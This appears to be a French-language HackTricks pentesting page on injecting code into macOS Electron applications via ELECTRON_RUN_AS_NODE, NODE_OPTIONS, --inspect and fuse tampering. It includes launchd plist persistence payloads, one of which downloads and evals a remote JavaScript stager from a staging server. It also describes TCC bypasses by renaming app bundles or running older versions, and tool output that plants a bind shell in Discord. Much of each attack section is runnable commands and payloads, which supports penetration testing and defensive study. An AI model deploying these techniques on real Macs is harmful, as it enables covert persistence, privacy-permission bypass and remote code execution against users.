# Injection dans les applications Electron macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? Ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Si vous ne savez pas ce qu'est Electron, vous pouvez trouver [**beaucoup d'informations ici**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Mais pour l'instant, sachez simplement qu'Electron exécute **node**.\
Et node a certains **paramètres** et **variables d'environnement** qui peuvent être utilisés pour **lui faire exécuter un autre code** que celui indiqué.

### Fusibles Electron

Ces techniques seront discutées ensuite, mais récemment Electron a ajouté plusieurs **drapeaux de sécurité pour les prévenir**. Ce sont les [**Fusibles Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) et voici ceux utilisés pour **empêcher** les applications Electron sur macOS de **charger du code arbitraire** :

* **`RunAsNode`** : S'il est désactivé, il empêche l'utilisation de la variable d'environnement **`ELECTRON_RUN_AS_NODE`** pour injecter du code.
* **`EnableNodeCliInspectArguments`** : S'il est désactivé, les paramètres tels que `--inspect`, `--inspect-brk` ne seront pas respectés. Évitant ainsi l'injection de code de cette manière.
* **`EnableEmbeddedAsarIntegrityValidation`** : S'il est activé, le fichier **`asar`** chargé sera validé par macOS. Empêchant ainsi l'injection de code en modifiant le contenu de ce fichier.
* **`OnlyLoadAppFromAsar`** : Si cela est activé, au lieu de rechercher le chargement dans l'ordre suivant : **`app.asar`**, **`app`** et enfin **`default_app.asar`**, il ne vérifiera et n'utilisera que app.asar, garantissant ainsi que lorsqu'il est **combiné** avec le fusible **`embeddedAsarIntegrityValidation`**, il est **impossible** de **charger du code non validé**.
* **`LoadBrowserProcessSpecificV8Snapshot`** : S'il est activé, le processus du navigateur utilise le fichier appelé `browser_v8_context_snapshot.bin` pour son instantané V8.

Un autre fusible intéressant qui n'empêchera pas l'injection de code est :

* **EnableCookieEncryption** : S'il est activé, le stockage des cookies sur le disque est chiffré à l'aide de clés de cryptographie au niveau du système d'exploitation.

### Vérification des fusibles Electron

Vous pouvez **vérifier ces drapeaux** à partir d'une application avec :
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modification des fusibles Electron

Comme le [**document le mentionne**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuration des **fusibles Electron** est configurée à l'intérieur du **binaire Electron** qui contient quelque part la chaîne **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Dans les applications macOS, cela se trouve généralement dans `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Vous pouvez charger ce fichier dans [https://hexed.it/](https://hexed.it/) et rechercher la chaîne précédente. Après cette chaîne, vous pouvez voir en ASCII un chiffre "0" ou "1" indiquant si chaque fusible est désactivé ou activé. Modifiez simplement le code hexadécimal (`0x30` est `0` et `0x31` est `1`) pour **modifier les valeurs des fusibles**.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Notez que si vous essayez de **écraser** le **binaire du framework Electron** à l'intérieur d'une application avec ces octets modifiés, l'application ne se lancera pas.

## RCE en ajoutant du code aux applications Electron

Il peut y avoir des **fichiers JS/HTML externes** qu'une application Electron utilise, de sorte qu'un attaquant peut injecter du code dans ces fichiers dont la signature ne sera pas vérifiée et exécuter du code arbitraire dans le contexte de l'application.

{% hint style="danger" %}
Cependant, il y a actuellement 2 limitations :

* L'autorisation **`kTCCServiceSystemPolicyAppBundles`** est **nécessaire** pour modifier une application, donc par défaut cela n'est plus possible.
* Le fichier **`asap`** compilé a généralement les fusibles **`embeddedAsarIntegrityValidation`** et **`onlyLoadAppFromAsar`** activés

Ce qui rend ce chemin d'attaque plus compliqué (ou impossible).
{% endhint %}

Notez qu'il est possible de contourner l'exigence de **`kTCCServiceSystemPolicyAppBundles`** en copiant l'application dans un autre répertoire (comme **`/tmp`**), en renommant le dossier **`app.app/Contents`** en **`app.app/NotCon`**, en **modifiant** le fichier **asar** avec votre code **malveillant**, en le renommant à nouveau en **`app.app/Contents`** et en l'exécutant.

## RCE avec `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si cette variable d'environnement est définie, elle démarrera le processus en tant que processus Node.js normal.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Si le paramètre **`RunAsNode`** du fusible est désactivé, la variable d'environnement **`ELECTRON_RUN_AS_NODE`** sera ignorée et cela ne fonctionnera pas.
{% endhint %}

### Injection à partir du fichier Plist de l'application

Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), vous pouvez exploiter cette variable d'environnement dans un fichier plist pour maintenir la persistance :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE avec `NODE_OPTIONS`

Vous pouvez stocker la charge utile dans un fichier différent et l'exécuter :

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Si le fusible **`EnableNodeOptionsEnvironmentVariable`** est **désactivé**, l'application **ignorera** la variable d'environnement **NODE\_OPTIONS** lorsqu'elle est lancée, sauf si la variable d'environnement **`ELECTRON_RUN_AS_NODE`** est définie, ce qui sera également **ignoré** si le fusible **`RunAsNode`** est désactivé.
{% endhint %}

### Injection à partir du fichier Plist de l'application

Vous pouvez exploiter cette variable d'environnement dans un fichier plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE avec l'inspection

Selon [**ceci**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si vous exécutez une application Electron avec des indicateurs tels que **`--inspect`**, **`--inspect-brk`** et **`--remote-debugging-port`**, un **port de débogage sera ouvert** afin que vous puissiez vous y connecter (par exemple depuis Chrome dans `chrome://inspect`) et vous pourrez **injecter du code** ou même lancer de nouveaux processus.\
Par exemple:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Si le fusible **`EnableNodeCliInspectArguments`** est désactivé, l'application **ignorera les paramètres node** (comme `--inspect`) lors du lancement, sauf si la variable d'environnement **`ELECTRON_RUN_AS_NODE`** est définie, ce qui sera également **ignoré** si le fusible **`RunAsNode`** est désactivé.

Cependant, vous pouvez toujours utiliser le paramètre electron `--remote-debugging-port=9229`, mais la charge utile précédente ne fonctionnera pas pour exécuter d'autres processus.
{% endhint %}

### Injection à partir du fichier Plist de l'application

Vous pouvez exploiter cette variable d'environnement dans un fichier Plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Contournement de TCC en abusant des anciennes versions

{% hint style="success" %}
Le démon TCC de macOS ne vérifie pas la version exécutée de l'application. Donc, si vous **ne pouvez pas injecter de code dans une application Electron** avec l'une des techniques précédentes, vous pouvez télécharger une version précédente de l'application et y injecter du code car elle obtiendra toujours les privilèges TCC.
{% endhint %}

## Injection automatique

L'outil [**electroniz3r**](https://github.com/r3ggi/electroniz3r) peut être facilement utilisé pour **trouver des applications Electron vulnérables** installées et y injecter du code. Cet outil essaiera d'utiliser la technique **`--inspect`** :

Vous devez le compiler vous-même et pouvez l'utiliser de cette manière :
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Références

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
